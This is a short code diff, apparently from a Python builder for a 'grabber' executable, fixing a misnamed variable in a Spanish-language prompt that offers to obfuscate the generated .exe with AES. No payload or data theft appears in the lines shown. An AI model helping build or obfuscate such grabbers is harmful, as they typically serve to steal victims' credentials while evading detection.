@@ -18,7 +18,7 @@ def create_grabber():
 
     tortuga(f"\n {Colors.purple}[{Colors.red}!{Colors.purple}]{Colors.white} ¿Deseas ofuscar {fileName}.exe?")
     yesno = input(f'\n {Colors.purple}[{Colors.light_blue}>{Colors.purple}] {Colors.purple}y{Colors.light_blue}/{Colors.purple}n: {Colors.white}')
-    if yesno.lower() == "y" or siono.lower() == "yes":
+    if yesno.lower() == "y" or yesno.lower() == "yes":
         IV = Random.new().read(AES.block_size)
         key = u''
         for i in range(8):
